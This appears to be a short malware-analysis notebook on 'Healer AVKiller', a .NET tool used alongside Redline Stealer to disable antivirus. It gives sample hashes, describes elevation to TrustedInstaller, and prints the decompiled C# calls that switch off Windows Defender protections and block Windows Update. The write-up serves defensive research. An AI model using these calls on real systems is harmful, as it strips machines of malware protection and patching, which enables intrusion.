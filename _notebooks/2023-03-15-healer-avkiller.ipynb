{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "8dae9330-7737-4619-ab01-aae0df9a38d4",
   "metadata": {},
   "source": [
    "# Healer AVKiller\n",
    "> Simple .NET hack tool used to kill AV\n",
    "\n",
    "- toc: true \n",
    "- badges: true\n",
    "- categories: [healer,avkiller,dotnet,TrustedInstaller]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "800466b9-894c-4b15-8c37-001673a43cdc",
   "metadata": {},
   "source": [
    "## Overview\n",
    "\n",
    "This small .NET hacking tool is often deployed along side Redline Stealer and is used to disable antivirus.\n",
    "\n",
    "## Samples\n",
    "\n",
    "- 976ba54ff3f8ab4c1d6fe5629460b1fc42106495ddb3151b52951030069b6d47 [UnpacMe Analysis](https://www.unpac.me/results/919f2d1b-4622-4070-b634-adffffa4daf8?hash=976ba54ff3f8ab4c1d6fe5629460b1fc42106495ddb3151b52951030069b6d47)\n",
    "- 850cd190aaeebcf1505674d97f51756f325e650320eaf76785d954223a9bee38 [UnpacMe Analysis](https://www.unpac.me/results/2950bddb-dba3-45a5-b00a-ed7e74c42495?hash=850cd190aaeebcf1505674d97f51756f325e650320eaf76785d954223a9bee38)\n",
    "- a4f91172441b827b1e0cc6d7fb58d904fb5dd3bca64f08be24c431db2fdcca6d [UnpacMe Analysis](https://www.unpac.me/results/99280669-8c9b-40d4-be2c-f088990dbd3b?hash=a4f91172441b827b1e0cc6d7fb58d904fb5dd3bca64f08be24c431db2fdcca6d)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f4023a69-19ba-472d-bacb-a3ef3d857b60",
   "metadata": {},
   "source": [
    "## Analysis\n",
    "\n",
    "When launched the binary first elevates to SYSTEM using token impersonation with the `winlogon` token, then it migrates to `TrustedInstaller` using the `TrustedInstaller` service token. \n",
    "With `TrustedInstaller` permissions it gains full access to the protected registry keys and services such as those used by Windows Defender. This is a well documented elevation tactic that is decribed in the 2017 blog post [The Art of Becoming TrustedInstaller](https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html).\n",
    "\n",
    "\n",
    "### Windows Defender Targets\n",
    "The following registry keys and services are dissabled.\n",
    "\n",
    "```c#\n",
    "Program.DisableService(\"WinDefend\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features\", \"TamperProtection\", \"0\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\", \"DisableAntiSpyware\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\", \"DisableBehaviorMonitoring\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\", \"DisableIOAVProtection\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\", \"DisableOnAccessProtection\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\", \"DisableRealtimeMonitoring\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\Real-Time Protection\", \"DisableScanOnRealtimeEnable\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center\\\\Notifications\", \"DisableNotifications\", \"1\");\n",
    "Program.DisableService(\"wuauserv\");\n",
    "Program.DisableService(\"WaaSMedicSvc\");\n",
    "Program.DisableService(\"UsoSvc\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\", \"AUOptions\", \"2\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\", \"AutoInstallMinorUpdates\", \"0\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\", \"NoAutoUpdate\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\", \"NoAutoRebootWithLoggedOnUsers\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\", \"UseWUServer\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\", \"DoNotConnectToWindowsUpdateInternetLocations\", \"1\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\", \"WUStatusServer\", \"server.wsus\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\", \"WUServer\", \"server.wsus\");\n",
    "Program.RegistryEdit(\"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\", \"UpdateServiceUrlAlternate\", \"server.wsus\");\n",
    "```\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "948b4457-f10c-4638-9d1a-e57743e1b4af",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
